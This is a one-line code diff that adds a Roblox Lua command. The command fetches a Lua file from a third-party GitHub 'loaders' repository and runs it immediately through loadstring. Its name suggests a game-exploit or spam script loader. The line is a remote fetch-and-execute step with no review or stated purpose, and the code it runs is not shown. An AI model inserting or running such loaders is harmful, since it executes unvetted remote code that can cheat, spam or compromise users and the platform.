@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/upd-8-cvr-retro-spam1-s3wp3snmm6a3hg.lua"))()
